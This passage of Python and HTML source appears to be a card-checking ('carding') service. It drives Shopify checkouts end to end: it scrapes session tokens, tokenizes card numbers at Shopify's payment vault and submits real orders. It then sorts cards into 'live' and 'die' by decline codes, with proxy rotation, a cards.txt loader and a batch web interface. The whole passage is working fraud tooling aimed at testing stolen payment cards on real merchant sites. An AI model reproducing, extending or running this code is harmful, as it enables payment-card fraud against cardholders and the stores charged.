                cr = await session.post(f"{ourl}/checkout/", allow_redirects=True, headers={**base_headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
                checkout_url = str(cr.url)
                page_text = cr.text
            except Exception as ex:
                return _r(f"CHECKOUT_FAILED: {type(ex).__name__}")
            
            lower_url = checkout_url.lower()
            if "login" in lower_url or "/account" in lower_url:
                return _r("SITE_REQUIRES_LOGIN")
            
            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
            attempt_token = m.group(1) if m else checkout_url.rstrip("/").split("/")[-1].split("?")[0]
            if not attempt_token or len(attempt_token) < 4:
                return _r("NO_ATTEMPT_TOKEN")
            
            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                return _r("NO_SESSION_TOKEN")
            
            queue_token = _extract(page_text, '"queueToken":"', '"') or ""
            stable_id = _extract(page_text, '"stableId":"', '"') or "1"
            merch_gid = _extract(page_text, "ProductVariantMerchandise/", "&quot;") or _extract(page_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or str(variant_id)
            
            for s, e in [('currencyCode":"', '"'), ('"currencyCode":"', '"')]:
                val = _extract(page_text, s, e)
                if val and len(val) == 3 and val.isalpha():
                    currency = val.upper()
                    break
            
            addr = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone = addr["phone"]
            street = addr["address1"]
            city = addr["city"]
            state = addr["zoneCode"]
            s_zip = addr["postalCode"]
            
            subtotal = _extract(page_text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                subtotal = m2.group(1) if m2 else "0.01"
            
            unescaped = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id = None
            m3 = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)
            
            source_token = _extract(page_text, 'name="serialized-sourceToken" content="', '"')
            ident_sig = None
            m4 = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if m4:
                ident_sig = m4.group(1)

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"
            gql_headers = {
                **base_headers,
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"] = build_id
                gql_headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            merch_id_full = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            def _base_vars() -> dict:
                return {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": first, "lastName": last,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": merch_id_full,
                                    "variantId": variant_id_full,
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": state, "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships": {"memberships": []},
                    "cartMetafields": [],
                }

            # 3. Shipping Proposal
            ship_vars = _base_vars()
            resp_json: Any = None
            for attempt in range(3):
                try:
                    r = await session.post(graphql_url, params={"operationName": "Proposal"}, headers=gql_headers, json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars, "operationName": "Proposal"})
                    resp_json = orjson.loads(r.content)
                except Exception:
                    if attempt < 2:
                        await asyncio.sleep(1)
                    continue
                
                data = resp_json.get("data", {}) or {}
                if data.get("session"):
                    break
                gql_errs = resp_json.get("errors", []) or []
                if gql_errs:
                    interpreted = _parse_gql_errors(gql_errs)
                    if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN", "THROTTLED", "NO_PRODUCT"):
                        return _r(interpreted)
                    if attempt < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return _r(interpreted if interpreted != "GRAPHQL_ERROR" else "GRAPHQL_ERROR")
            
            if not resp_json or not (resp_json.get("data") or {}).get("session"):
                return _r("GRAPHQL_ERROR")
            
            try:
                _ship_sst = r.headers.get("x-checkout-one-session-token")
                if _ship_sst:
                    sst = _ship_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            session_data = resp_json["data"]["session"]
            negotiate = session_data.get("negotiate") or {}
            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                code = _parse_gql_errors(neg_errors)
                if code != "GRAPHQL_ERROR":
                    return _r(code)
            
            result_obj = negotiate.get("result") or {}
            result_type = result_obj.get("__typename", "")
            if result_type == "CheckpointDenied":
                return _r("CHECKPOINTDENIED")
            if result_type in ("Throttled", "TooManyRequests"):
                return _r("THROTTLED")
            if result_type == "NegotiationResultFailed":
                return _r("NEGOTIATE_FAILED")
            
            checkpoint_data = result_obj.get("checkpointData")
            seller = result_obj.get("sellerProposal") or {}
            if not seller:
                return _r("NO_SELLER_PROPOSAL")
            
            running_total_data = seller.get("runningTotal") or {}
            running_total = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")
            
            delivery_data = seller.get("delivery") or {}
            delivery_strategy = ""
            shipping_amount = 0.0
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines") or []
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            amt_data = strategies[0].get("amount") or {}
                            shipping_amount = float(amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0")
                        except (ValueError, TypeError):
                            shipping_amount = 0.0
            
            tax_data = seller.get("tax") or {}
            tax_amount = 0.0
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amt_data = tax_data.get("totalTaxAmount") or {}
                    tax_amount = float(tax_amt_data.get("value", {}).get("amount") or tax_amt_data.get("amount") or "0")
                except (ValueError, TypeError):
                    pass
            
            payment_data = seller.get("payment") or {}
            payment_identifier = None
            if payment_data.get("__typename") == "FilledPaymentTerms":
                avail_lines = payment_data.get("availablePaymentLines") or []
                for line in avail_lines:
                    pm = line.get("paymentMethod") or {}
                    pid = pm.get("paymentMethodIdentifier")
                    if pid:
                        detected_gateway = (pm.get("extensibilityDisplayName") or pm.get("name") or pm.get("brand") or "Shopify Payments")
                        if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                            payment_identifier = pid
                            gateway = detected_gateway
                            price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                            if float(price) > MAX_PRICE:
                                return _r(f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}")
                            break
            
            if not payment_identifier:
                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY")

            # 4. Delivery Proposal
            deliv_vars = copy.deepcopy(ship_vars)
            deliv_vars["sessionInput"]["sessionToken"] = sst
            deliv_vars["delivery"]["deliveryLines"][0].update({
                "destination": {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                "destinationChanged": False,
            })
            deliv_vars["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }
            deliv_vars["taxes"]["proposedTotalAmount"] = {"value": {"amount": str(tax_amount), "currencyCode": currency}}
            deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {"number": phone, "countryCode": country_code}
            if checkpoint_data:
                deliv_vars["checkpointData"] = checkpoint_data
            
            try:
                dr = await session.post(graphql_url, params={"operationName": "Proposal"}, headers=gql_headers, json={"query": QUERY_PROPOSAL_DELIVERY, "variables": deliv_vars, "operationName": "Proposal"})
                d_resp = orjson.loads(dr.content)
                _del_sst = dr.headers.get("x-checkout-one-session-token")
                if _del_sst:
                    sst = _del_sst
                    gql_headers["x-checkout-one-session-token"] = sst
                
                d_result = (d_resp.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}))
                if d_result:
                    d_typename = d_result.get("__typename", "")
                    if d_typename == "SubmittedForCompletion":
                        return _r("NO_PAYMENT_REQUIRED")
                    
                    d_seller = d_result.get("sellerProposal") or {}
                    d_total = d_seller.get("total") or d_seller.get("runningTotal") or {}
                    d_amt = d_total.get("value", {}).get("amount") or d_total.get("amount")
                    if d_amt:
                        running_total = d_amt
                        try:
                            price = f"{float(running_total):.2f}"
                        except (ValueError, TypeError):
                            pass
                        if float(price) > MAX_PRICE:
                            return _r(f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}")
            except Exception as ex:
                log.debug("delivery proposal error: %s", ex)

            # 5. Tokenize Card
            vault_payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(month),
                    "year": int(f"20{year}"),
                    "verification_value": cvv,
                    "name": f"{first} {last}",
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                },
                "payment_session_scope": hostname,
            }
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "User-Agent": ua,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig
            
            vault_endpoints = [
                "https://checkout.pci.shopifyinc.com/sessions",
                "https://deposit.shopifyinc.com/sessions",
            ]
            token = None
            for vault_url in vault_endpoints:
                try:
                    vr = await session.post(vault_url, json=vault_payload, headers=vault_headers)
                    vd = orjson.loads(vr.content)
                    token = vd.get("id")
                    if token:
                        break
                except Exception:
                    continue
            
            if not token:
                return _r("TOKENIZATION_FAILED")

            # 6. Submit for Completion
            billing_addr = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }
            
            def _build_submit_body() -> dict:
                submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
                submit_deliv_line["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                    "options": {"phone": phone},
                }
                submit_deliv_line["expectedTotalPrice"] = {"any": True}
                submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                for ml in submit_merch.get("merchandiseLines", []):
                    ml["expectedTotalPrice"] = {"any": True}
                return {
                    "query": MUTATION_SUBMIT,
                    "variables": {
                        "input": {
                            "sessionInput": {"sessionToken": sst},
                            "queueToken": queue_token or "",
                            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                            "delivery": {
                                "deliveryLines": [submit_deliv_line],
                                "noDeliveryRequired": [],
                                "useProgressiveRates": True,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping": True,
                            },
                            "merchandise": submit_merch,
                            "payment": {
                                "totalAmount": {"any": True},
                                "paymentLines": [{
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": payment_identifier,
                                            "sessionId": token,
                                            "billingAddress": billing_addr,
                                            "cardSource": None,
                                        }
                                    },
                                    "amount": {"any": True},
                                    "dueAt": None,
                                }],
                                "billingAddress": billing_addr,
                            },
                            "buyerIdentity": copy.deepcopy(deliv_vars["buyerIdentity"]),
                            "taxes": {
                                "proposedAllocations": None,
                                "proposedTotalAmount": {"any": True},
                                "proposedTotalIncludedAmount": None,
                                "proposedMixedStateTotalAmount": None,
                                "proposedExemptions": [],
                            },
                            "tip": {"tipLines": []},
                            "note": {"message": None, "customAttributes": []},
                            "localizationExtension": {"fields": []},
                            "nonNegotiableTerms": None,
                            "optionalDuties": {"buyerRefusesDuties": False},
                            **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                        },
                        "attemptToken": attempt_token,
                        "metafields": [],
                        "analytics": {"requestUrl": checkout_url},
                    },
                    "operationName": "SubmitForCompletion",
                }
            
            s_resp: dict = {}
            for submit_attempt in range(3):
                try:
                    sr = await session.post(graphql_url, params={"operationName": "SubmitForCompletion"}, headers=gql_headers, json=_build_submit_body())
                    s_resp = orjson.loads(sr.content)
                    _sub_sst = sr.headers.get("x-checkout-one-session-token")
                    if _sub_sst:
                        sst = _sub_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except Exception as ex:
                    log.debug("submit exception: %s", ex)
                    return _r("SUBMIT_FAILED")
                
                s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                if not s_data:
                    errs = s_resp.get("errors") or []
                    if errs:
                        for err_item in errs:
                            for fld in ("code", "message"):
                                val = str(err_item.get(fld) or "").upper()
                                if val:
                                    norm = _normalize_response(val)
                                    if norm != "CARD_DECLINED":
                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                                        return _r(norm, approved=approved)
                    return _r("GRAPHQL_ERROR")
                
                stype = s_data.get("__typename", "")
                if stype == "SubmitRejected":
                    sub_errs = s_data.get("errors") or []
                    all_confirmable = all(e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs) if sub_errs else False
                    if all_confirmable and submit_attempt < 2:
                        await asyncio.sleep(0.5)
                        continue
                break
            
            stype = s_data.get("__typename", "")
            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype = receipt.get("__typename", "")
                if rtype == "ProcessedReceipt":
                    return _r("ORDER_PLACED", charged="True", approved="True")
                if rtype == "ActionRequiredReceipt":
                    return _r("3DS_REQUIRED", approved="True")
                if rtype == "FailedReceipt":
                    pe = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                        return _r("NO_PRODUCT")
                    if pe_type == "OrderCreationFailure":
                        return _r("ORDER_CREATION_FAILED")
                    code = str(pe.get("code") or "").upper()
                    msg = str(pe.get("messageUntranslated") or "").upper()
                    raw = code if code and code not in ("GENERIC_ERROR", "") else msg
                    norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                    approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                    return _r(norm, approved=approved)
                
                rid = receipt.get("id")
                if rid:
                    poll_body = {"query": QUERY_POLL, "variables": {"receiptId": rid, "sessionToken": sst}, "operationName": "PollForReceipt"}
                    await asyncio.sleep(2)
                    for _ in range(6):
                        try:
                            pr = await session.post(graphql_url, params={"operationName": "PollForReceipt"}, headers=gql_headers, json=poll_body)
                            pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                            pt = pd.get("__typename", "")
                            if pt == "ProcessedReceipt":
                                return _r("ORDER_PLACED", charged="True", approved="True")
                            if pt == "ActionRequiredReceipt":
                                return _r("3DS_REQUIRED", approved="True")
                            if pt == "FailedReceipt":
                                pe = pd.get("processingError") or {}
                                pe_type = pe.get("__typename", "")
                                if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                                    return _r("NO_PRODUCT")
                                code = str(pe.get("code") or "").upper()
                                msg = str(pe.get("messageUntranslated") or "").upper()
                                if code == "CAPTCHA_REQUIRED":
                                    return _r("CAPTCHA_REQUIRED", approved="False")
                                raw = code if code and code not in ("GENERIC_ERROR", "") else msg
                                norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                                approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                                return _r(norm, approved=approved)
                            if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                delay = pd.get("pollDelay", 3000) / 1000
                                await asyncio.sleep(min(delay, 4))
                                continue
                        except Exception:
                            pass
                        break
                return _r("CARD_DECLINED")
            
            if stype == "SubmitFailed":
                return _r(_normalize_response(str(s_data.get("reason") or "")))
            if stype == "SubmitRejected":
                errs = s_data.get("errors") or []
                if errs:
                    best_code = "CARD_DECLINED"
                    for err_item in errs:
                        for fld in ("code", "nonLocalizedMessage", "localizedMessage", "localizedMessageHtml"):
                            val = str(err_item.get(fld) or "").upper()
                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED", "PAYMENT ERROR"):
                                continue
                            norm = _normalize_response(val)
                            if norm != "CARD_DECLINED":
                                best_code = norm
                                break
                        if best_code != "CARD_DECLINED":
                            break
                    approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                    return _r(best_code, approved=approved)
                return _r("CARD_DECLINED")
            if stype == "Throttled":
                return _r("THROTTLED")
            if stype == "CheckpointDenied":
                return _r("CHECKPOINTDENIED")
            return _r("CARD_DECLINED")

        except (asyncio.TimeoutError, RequestsError):
            return _r("TIMEOUT")
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            return {
                "Response": "ERROR",
                "CC": f"{cc}|{month}|{year}|{cvv}",
                "Price": price,
                "Gate": gateway,
                "Site": ourl,
                "Charged": "False",
                "Approved": "False",
                "Time": f"{round(time.time() - t0, 2)}s",
                "Detail": f"{type(ex).__name__}: {str(ex)[:100]}",
            }
        finally:
            if owned:
                await session.close()

# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED",
})

@app.get("/shopify")
async def shopify_route(
    site: str = Query(..., description="Shopify store URL"),
    cc: Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    max_price: Optional[float] = Query(None, description="Max product price override"),
):
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)
    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse({"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."}, status_code=400)
        card = random.choice(cards)
    
    result = await validate_card(
        card["cc"], card["month"], card["year"], card["cvv"],
        site, proxy_str=proxy, max_price=max_price,
    )
    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] = _stats.get(f"response_{result.get('Response', 'UNKNOWN')}", 0) + 1
    return JSONResponse(result)

@app.get("/check")
async def check_route(
    site: str = Query(..., description="Shopify store URL to check"),
    card: Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    max_price: Optional[float] = Query(None, description="Max product price override"),
):
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)
    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse({"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."}, status_code=400)
        parsed = random.choice(cards)
    
    site = site.strip()
    ourl = site if site.startswith("http") else f"https://{site}"
    result = await validate_card(
        parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
        ourl, proxy_str=proxy, max_price=max_price,
    )
    response_code = result.get("Response", "")
    _stats[f"response_{response_code or 'UNKNOWN'}"] = _stats.get(f"response_{response_code or 'UNKNOWN'}", 0) + 1
    
    return JSONResponse({
        "valid": response_code in LIVE_RESPONSES,
        "site": site,
        "product": result.get("Product", ""),
        "price": result.get("Price", "0.00"),
        "card_response": response_code,
        "gate": result.get("Gate", "UNKNOWN"),
        "approved": result.get("Approved", "False"),
        "charged": result.get("Charged", "False"),
        "time": result.get("Time", ""),
    })

@app.get("/health")
async def health_route():
    cards = _get_cards()
    return JSONResponse({
        "status": "ok",
        "cards_loaded": len(cards),
        "pool_size": POOL_SIZE,
        "site_concurrency": SITE_CONCURRENCY,
        "cache_ttl": CACHE_TTL,
        "max_price": MAX_PRICE,
    })

@app.get("/stats")
async def stats_route():
    return JSONResponse(dict(_stats))

@app.post("/cache/clear")
async def cache_clear_route():
    count = len(_product_cache)
    _product_cache.clear()
    _product_locks.clear()
    return JSONResponse({"cleared": count})

@app.post("/reload")
async def reload_route():
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})

# ---------------------------------------------------------------------------
# UI
# ---------------------------------------------------------------------------
INDEX_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shopify Validator Pro</title>
<style>
:root { --bg: #0f111a; --panel: #1a1d27; --border: #2a2d3a; --text: #e2e8f0; --dim: #94a3b8; --accent: #6366f1; --success: #10b981; --danger: #ef4444; --warn: #f59e0b; }
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
.container { max-width: 1400px; margin: 0 auto; }
.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
.card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }
h2 { margin-top: 0; font-size: 1.2rem; color: var(--accent); }
textarea, input, select { width: 100%; background: #0d0f15; border: 1px solid var(--border); color: var(--text); padding: 10px; border-radius: 4px; font-family: monospace; box-sizing: border-box; }
label { display: block; margin-bottom: 5px; color: var(--dim); font-size: 0.9rem; }
.btn { padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; transition: opacity 0.2s; }
.btn-primary { background: var(--accent); color: white; }
.btn-danger { background: var(--danger); color: white; }
.btn:hover { opacity: 0.9; }
.controls { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; margin-top: 15px; }
.stats-bar { display: flex; gap: 20px; justify-content: space-around; background: var(--panel); padding: 15px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 20px; }
.stat-item { text-align: center; }
.stat-val { font-size: 1.5rem; font-weight: bold; font-family: monospace; }
.stat-lbl { font-size: 0.8rem; color: var(--dim); text-transform: uppercase; }
.results-table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
.results-table th, .results-table td { padding: 10px; text-align: left; border-bottom: 1px solid var(--border); }
.results-table th { color: var(--dim); font-weight: normal; }
.badge-live { color: var(--success); font-weight: bold; }
.badge-die { color: var(--danger); font-weight: bold; }
.badge-err { color: var(--warn); font-weight: bold; }
.tabs { display: flex; gap: 10px; margin-bottom: 10px; }
.tab { padding: 5px 15px; cursor: pointer; border-bottom: 2px solid transparent; color: var(--dim); }
.tab.active { color: var(--text); border-bottom-color: var(--accent); }
.hidden { display: none; }
</style>
</head>
<body>
<div class="container">
    <div class="grid">
        <div class="card">
            <h2>Sites List</h2>
            <label>Paste Shopify URLs (one per line)</label>
            <textarea id="sites" rows="10" placeholder="example.myshopify.com\nstore.brand.com"></textarea>
        </div>
        <div class="card">
            <h2>Cards List</h2>
            <label>Paste Cards (cc|mm|yy|cvv) - Leave empty to use server cards.txt</label>
            <textarea id="cards" rows="10" placeholder="4532...|12|28|123"></textarea>
        </div>
    </div>

    <div class="card">
        <h2>Configuration</h2>
        <div class="controls">
            <div style="flex:1"><label>Endpoint</label><select id="endpoint"><option value="/check">/check (Fast)</option><option value="/shopify">/shopify (Full)</option></select></div>
            <div style="flex:1"><label>Max Price ($)</label><input type="number" id="max_price" value="500"></div>
            <div style="flex:1"><label>Threads</label><select id="threads"><option value="1">1</option><option value="3" selected>3</option><option value="5">5</option><option value="10">10</option></select></div>
            <div style="flex:2"><label>Proxy (Optional)</label><input type="text" id="proxy" placeholder="ip:port:user:pass"></div>
        </div>
        <div class="controls" style="margin-top:15px;">
            <button class="btn btn-primary" id="btn-start" onclick="startBatch()">START BATCH</button>
            <button class="btn btn-danger" id="btn-stop" onclick="stopBatch()" disabled>STOP</button>
            <button class="btn" onclick="clearResults()">CLEAR RESULTS</button>
        </div>
    </div>

    <div class="stats-bar">
        <div class="stat-item"><div class="stat-val" id="s-total">0</div><div class="stat-lbl">Total</div></div>
        <div class="stat-item"><div class="stat-val" id="s-done">0</div><div class="stat-lbl">Done</div></div>
        <div class="stat-item"><div class="stat-val" id="s-live" style="color:var(--success)">0</div><div class="stat-lbl">Live</div></div>
        <div class="stat-item"><div class="stat-val" id="s-die" style="color:var(--danger)">0</div><div class="stat-lbl">Die</div></div>
        <div class="stat-item"><div class="stat-val" id="s-err" style="color:var(--warn)">0</div><div class="stat-lbl">Err</div></div>
        <div class="stat-item"><div class="stat-val" id="s-time">00:00</div><div class="stat-lbl">Elapsed</div></div>
    </div>

    <div class="card">
        <div class="tabs">
            <div class="tab active" onclick="switchTab('all')">All Results</div>
            <div class="tab" onclick="switchTab('live')">Live Only</div>
            <div class="tab" onclick="switchTab('die')">Dies Only</div>
        </div>
        <table class="results-table">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Site</th>
                    <th>Status</th>
                    <th>Card</th>
                    <th>Gateway</th>
                    <th>Product</th>
                    <th>Time</th>
                </tr>
            </thead>
            <tbody id="results-body">
                <tr><td colspan="7" style="text-align:center;color:var(--dim)">Awaiting start...</td></tr>
            </tbody>
        </table>
    </div>
</div>

<script>
let isRunning = false;
let stopFlag = false;
let results = [];
let startTime = 0;
let timerInt = null;
let currentTab = 'all';

function switchTab(tab) {
    currentTab = tab;
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    event.target.classList.add('active');
    renderTable();
}

function clearResults() {
    results = [];
    renderTable();
    updateStats();
}

function formatTime(sec) {
    const m = Math.floor(sec / 60).toString().padStart(2, '0');
    const s = (sec % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
}

function updateStats() {
    const total = results.length;
    const live = results.filter(r => r.status === 'LIVE').length;
    const die = results.filter(r => r.status === 'DIE').length;
    const err = results.filter(r => r.status === 'ERR').length;
    
    document.getElementById('s-total').innerText = total;
    document.getElementById('s-done').innerText = total;
    document.getElementById('s-live').innerText = live;
    document.getElementById('s-die').innerText = die;
    document.getElementById('s-err').innerText = err;
}

function renderTable() {
    const tbody = document.getElementById('results-body');
    tbody.innerHTML = '';
    
    let filtered = results;
    if (currentTab === 'live') filtered = results.filter(r => r.status === 'LIVE');
    if (currentTab === 'die') filtered = results.filter(r => r.status === 'DIE');

    if (filtered.length === 0) {
        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--dim)">No results</td></tr>';
        return;
    }

    filtered.forEach((r, idx) => {
        const tr = document.createElement('tr');
        let badgeClass = 'badge-die';
        if (r.status === 'LIVE') badgeClass = 'badge-live';
        if (r.status === 'ERR') badgeClass = 'badge-err';
        
        tr.innerHTML = `
            <td>${idx + 1}</td>
            <td>${r.site}</td>
            <td><span class="${badgeClass}">${r.response}</span></td>
            <td style="font-family:monospace;font-size:0.8em">${r.cc_masked || '-'}</td>
